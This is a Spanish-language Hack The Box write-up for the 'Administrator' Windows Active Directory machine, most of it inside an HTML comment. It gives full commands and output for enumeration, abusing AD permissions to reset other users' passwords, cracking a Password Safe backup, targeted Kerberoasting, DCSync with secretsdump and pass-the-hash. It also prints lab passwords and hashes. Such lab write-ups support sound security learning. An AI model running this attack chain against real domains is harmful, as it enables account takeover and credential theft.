---
description: >-
  Writeup de la máquina de dificultad media Administrator de la página https://hackthebox.eu
title: HTB - Administrator | (Difficulty Medium) - Windows
date: 2025-01-29
categories: [Writeup, Hack the Box]
tags: [htb, hacking, hack the box, active directory, medium, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/9d60c834-3318-4bfd-910e-a6c5febfcba0
---

## Useful Skills

* Enumeración DNS (dig)
* RPC Enumeration (rpcclient)
* SMB Enumeration (netexec)
* LDAP Enumeration (netexec + ldapsearch)
* BloodHound analysis
* Abusing GenericAll permission
* Abusing Force Change Password permission
* Cracking password Backup.psafe3 (pwsafe2john)
* Abusing GenericWrite Permission
* DCSync Attack (secretsdump)
* Pass The Hash (evil-winrm)

> En este escenario, comenzaremos con las siguientes credenciales (usuario: olivia, contraseña: ichliebedich)
{: .prompt-info }

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.42 --ulimit 5000 -g
10.10.11.42 -> [21,53,88,135,139,389,445,464,593,9389,3268,3269,47001,49664,49665,49666,49667,49668,60306,60293,60286,60281]
```

```bash
nmap -p21,53,88,135,139,389,445,464,593,9389,3268,3269,47001,49664,49665,49666,49667,49668,60306,60293,60286,60281 -sCV 10.10.11.42 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 15:37 CET
Nmap scan report for 10.10.11.42
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-29 21:37:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
60281/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60286/tcp open  msrpc         Microsoft Windows RPC
60293/tcp open  msrpc         Microsoft Windows RPC
60306/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2025-01-29T21:38:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.83 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.42 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 15:39 CET
Nmap scan report for 10.10.11.42
Host is up (0.035s latency).
Not shown: 1496 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    open   domain
88/udp    open   kerberos-sec
123/udp   open   ntp
21710/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```

> Esta máquina sigue activa en HackTheBox. Una vez que se retire, este artículo se publicará para acceso público, de acuerdo con la política de HackTheBox sobre la publicación de contenido de su plataforma.
{: .prompt-danger }
<!--
> Hay que añadir el dominio administrator.htb en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 10.10.11.42
{: .prompt-tip }

### DNS Enumeration

Intento obtener información adicional sobre el dominio a través de consultas DNS con dig, donde intento obtener los registros NS, MX, CNAME entre otros, posteriormente, trato de realizar una transferencia de zona, pero esta resulta fallida.

```bash
dig administrator.htb@10.10.11.42 axfr

; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> administrator.htb@10.10.11.42 axfr
;; global options: +cmd
; Transfer failed.
```

### SMB Enumeration

Utilizo NetExec para realizar un escaneo de SMB y obtener información clave como el sistema operativo, nombre del servidor, dominio, si la firma smb está habilita y si la versión antigua SMBv1 está activada o desactivada.

```bash
netexec smb 10.10.11.42
SMB  10.10.11.42 445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC)(domain:administrator.htb)  (signing:True)  (SMBv1:False)
```

Utilizo NetExec para enumerar los recursos compartidos del sistema a través del protocolo SMB, ejecutando el comando con el usuario Olivia y la contraseña ichliebedich y así poder identificar qué recursos pueden ser accedidos. No obtengo nada interesante.

```bash
netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share 
```

### RPC Enumeration

Haciendo uso de las credenciales válidas, intento enumerar los usuarios usando la herramienta rpcclient. Obtengo con éxito los nombres de usuarios del sistema.

```bash
rpcclient -U administrator.htb/olivia%ichliebedich 10.10.11.42 -c enumdomusers | grep -oP '\[.*?\]' | tr -d '[]' | grep -v 0x
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
```

> Sabiendo los usuarios del sistema, una de las posibles vías de ataque a considerar sería el AS-REP Roasting
{: .prompt-tip }

### LDAP Enumeration

Utilizo NetExec para verificar si las credenciales (olivia:ichliebedich) son válidas para conectarme al servicio LDAP.

```bash
netexec ldap 10.10.11.42 -u 'olivia' -p 'ichliebedich'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\olivia:ichliebedich 
```

Haciendo uso de las credenciales válidas (olivia:ichliebedich), intento enumerar los usuarios del sistema utilizando la herramienta ldapsearch, este método es una alternativa a la enumeración de usuarios mediante rpcclient.

```bash
ldapsearch "objectclass=user" -x -H ldap://10.10.11.42 -b "dc=administrator,dc=htb" -D "olivia@administrator.htb" -w "ichliebedich" | grep sAMAccountName | cut -d : -f 2
 Administrator
 Guest
 DC$
 krbtgt
 olivia
 michael
 benjamin
 emily
 ethan
 alexander
 emma
```

## Gain access

Haciendo uso de las credenciales válidas (olivia:ichliebedich), intento verificar con NetExec si puedo acceder al sistema mediante el servicio WinRM. Obtengo un (Pwned!) lo que indica que las credenciales proporcionadas son válidas

```bash
netexec winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```

Accedo al sistema con evil-winrm como el usuario olivia

```bash
evil-winrm -i 10.10.11.42 -u olivia -p ichliebedich
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```

## Privilege escalation

Utilizo BloodHound para identificar puntos débiles en la configuración de Active Directory que me puedan permitir escalar mis privilegios

```bash
bloodhound-python -u 'olivia' -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 07S
```

```bash
neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2025-01-29 16:57:42.929+0000 INFO  Starting...
2025-01-29 16:57:43.272+0000 INFO  This instance is ServerId{c79aff68} (c79aff68-d2d1-422e-b680-b0424c4ea5de)
2025-01-29 16:57:44.300+0000 INFO  ======== Neo4j 4.4.16 ========
2025-01-29 16:57:45.316+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2025-01-29 16:57:45.316+0000 INFO  Updating the initial password in component 'security-users'
2025-01-29 16:57:45.520+0000 INFO  Bolt enabled on localhost:7687.
2025-01-29 16:57:46.208+0000 INFO  Remote interface available at http://localhost:7474/
2025-01-29 16:57:46.212+0000 INFO  id: DFBA69E397E88AF1BC8E85BBEEFD400D7D976EDAECF75F3A77F903544778EE72
2025-01-29 16:57:46.213+0000 INFO  name: system
2025-01-29 16:57:46.213+0000 INFO  creationDate: 2025-01-29T16:57:12.71Z
2025-01-29 16:57:46.213+0000 INFO  Started.
```

En BloodHound observo que Olivia tiene permisos GenericAll sobre Michael, este permiso permite un control total sobre el objeto, por ejemplo cambiar la contraseña del usuario.

![imagen](https://github.com/user-attachments/assets/1e4b0ae8-f075-4a55-b24c-daa986bb57ed)

Descargo e importo PowerView.ps1

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> upload PowerView.ps1
                                        
Info: Uploading /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1 to C:\Users\olivia\Documents\BloodHound\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> Import-Module .\PowerView.ps1
```

Defino la contraseña que voy a asignar el usuario michael

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

Asigno la contraseña definida $SecPassword al usuario michael

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> Set-DomainUserPassword -Identity michael -AccountPassword $SecPassword
```

Inicio como el usuario michael con la contraseña que he establecido en este caso Password123!

```bash
evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents>
```

En BloodHound observo que Michael tiene el permiso Force Change Password sobre Michael, este permiso puede forzar que al otro usuario a cambiar su contraseña en el próximo inicio de sesión

![imagen](https://github.com/user-attachments/assets/7be164a7-ce08-4c35-b107-e9f26a844716)

Descargo e importo PowerView.ps1

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> upload PowerView.ps1
                                        
Info: Uploading /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1 to C:\Users\michael\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> Import-Module .\PowerView.ps1
```

Defino la contraseña que voy a asignar el usuario benjamin

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> $Password = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force```
```

Asigno la contraseña definida $SecPassword al usuario benjamin

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $Password
```

Observo que al intentar acceder por winrm con el usuario Benjamin no puedo, por lo que accedo por FTP con las credenciales (Benjamin:Password1234!) y observo un archivo Backup.psafe3 el cual traigo a mi máquina local.

```bash
ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:juanca): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49980|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||49982|)
125 Data connection already open; Transfer starting.
100% |***************************************|   952        7.18 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (7.17 KiB/s)
```

El archivo Backup.psafe3 pertenece al gestor de contraseñas Password Safe, es un gestor de contraseñas de código abierto para el sistema operativo Windows que utiliza un cifrado AES a 256 bits.

* [Download Password Safe](https://sourceforge.net/projects/passwordsafe/)

Obtengo el hash del archivo Backup.psafe3 con pwsafe2john

```bash
pwsafe2john Backup.psafe3 > hash
```

Utilizo John The Ripper para intentar crackear la contraseña de Backup.psafe3, consigo obtener las contraseña la cual es tekieromucho

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-01-29 19:34) 3.225g/s 26425p/s 26425c/s 26425C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Abro el archivo Backup.psafe3 con el gestor de contraseñas Password Safe e introduzco la contraseña tekieromucho

![imagen](https://github.com/user-attachments/assets/7f9bdd6d-1259-41ad-97ad-1753a6ba1a75)

![imagen](https://github.com/user-attachments/assets/733fd421-aa41-4e64-b00e-8f6b38b2aa94)

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Accedo como emily al sistma con evil-winrm

```bash
evil-winrm -i 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents>
```

En BloodHound observo que Emily tiene el permiso GenericWrite sobre Ethan, este permiso puede ser explotado para actualizar atributos como permisos de cuenta, o incluso ejecutar la escalada de privilegios modificando scripts de inicio de sesión o directores de servicio.

![imagen](https://github.com/user-attachments/assets/850405bf-dddb-4e96-9a09-0055958aec32)

Una de los ataques que me permite realizar el permiso GenericWrite es un Kerberoast haciendo uso de la herramienta targetedKerberoast.py, a diferencia de impacket-GetUserSPNs targetedKerberoast abusa del permiso GenericWrite para establecer un SPN a un usuario, despues imprimir el hash crackeable y por último borrar el SPN establecido anteriormente.

```
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$6faf1dcae26015ececf2a8e938507718$780aace572facdc088cecfb21f171b2f58c3a9a0fdf7fca4eafb3a69c6ad81c732f409693baca2062b3a6458671022f52e50340018a964394889e3d254f22340fcdb78821d9175a47ba957dedd2ab73403bbe7a94e48c23af5d9b04fcd92c47c55e622e32aba118f0d5e20c4360b45cfaeb7a23f668a6c52b3491ec46ce53cc244936f32df1f53ae9a57fff5257d40fb45fc7bafc17199e19280218e4172e90a74bd7bfc604fa2a542826356340f08c39e62cf0121035570b9b7df09a8da7f5de1b4bb62259ff8bcb61401f500f7e6b2c0b4b98171ad02a8d4609074ddcdcdab5d0a36d1e448f57061d5e4f374b5b20689b71bb1f313eb3a1e5aa255497ec89a6ec9ac6f4d3b0eaf360d0b8cd5ec8ab8f6d5f77a9877a5ddd3988e87815dd05e2b5d9b5086c0504223aa22b90d4c04958510d88072e86d074b9d613926f0792251038043c889644218bdf33bd39409d0449ae146f80dc60142822038ae5a2934983cbee6f32ab820c5a803197506efc7416f414e6846007826f8b6e9ac0d3410de1c28c78dcd76d474394c4a7c6cc04e9d6ff629fa584be68ae55e258f7836385bc5fc08ffd1639c88d9d4552a92c8337aab889969021102583589c29e8065475f1355ed3dc26e714358090b0b29e8dea50b759a9cb61e58f56938f7f59296794ee5c8628f136c9c14dda2594d14e18a91b599ea09b03580944b5e4cee42077dc4a0c15e46e3312dc051c9895afef47a02f1db966e59f51258140317aadf97332a306658ae9d121af72024eda9e5707c19363892c44f26ca40e64dbd39273d060c7db4d50c01ecc6b40bf7c8a29a8d0982c9aeefa67642959d8480d87b58e7d59a45a176c4994edbee982da6a4d69e4508a4f58a37010153c28afaa429bdbd014dcd2744fdb9c7a4158327d223d9bdbc4b00deca920f191c72ee664b5bf8048d63b50cab68dffaaad0ae52589e7c2958d6df8be2f9bdea40ad5d153250307a24211bfb52f074d7b798d15e6e792da622f61d1c9b02bd2aaa3179d730fc406a538540cba6f66049aea03c79e7198638ec4eea6973f6824256e133203fcac4db3783a64999cd2ec31ca2b04b92af44c55de8733b418d3dc82af8b78b884f6bb3d88d7220b6bb13283c329f403da8d44a593e9b93007a99f4a58a0db2e95d96128d8b9c11f0ce992a39dafaee38446e80e9afd3655adf8d3fb0f589348892da3394cb2c26ccd6e53d33c6ae601eacd9de179a85539d8510472dc99fee6294c8536dbf16407aae7edf463c849aecc3772dffcbc5b0118c65c519850cffd7b12003a951d8c114b41050c97c50e0844670fec7eb3a9cffcfda385b0bdd3f58b53a155bc21f5b74fefe5cc60eda1c2909e25730cfb9ef1c341c5ce43834812374f63f63dc1d891c8fedb1ee435772977852fab1f0c526cda01d29a67ab0a3812139c2b42d984dd96f4ca5caa638f6417c48192fffb71dfbefd323fef14f338b12ae6ca86b22065b4b5a2fad4266a9fbb2af3143e76aa3168ce224d12faed97b7eb590
[VERBOSE] SPN removed successfully for (ethan)
```

Crackeo con Jhon The Ripper el hash y consigo obtener la contraseña de Ethan, la cual es limpbizkit

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2025-01-30 19:41) 100.0g/s 512000p/s 512000c/s 512000C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Visualizo en BloodHound que como el usuario Ethan puedo realizar un DCSync, basicamente este ataque permite explotar el protocolo Directory Replication Service (DRS) para hacerse pasar por un controlador de dominio legítimo y solicitar la replicación de credenciales de los usuarios, incluidos los hashes de sus contraseñas.

![imagen](https://github.com/user-attachments/assets/ee190edb-e55b-458e-b90a-7f17eb82e25c)

Realizo el ataque con impacket-secretsdump y obtengo las contraseñas y hashes de todos los usuarios

```bash
impacket-secretsdump 'administrator.htb'/'Ethan':'limpbizkit'@'administrator.htb'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
```

Por ultimo utilizo evil-winrm para realizar un Pass The Hash (PtH) y acceder como el usuario Administrator

```bash
evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
-->
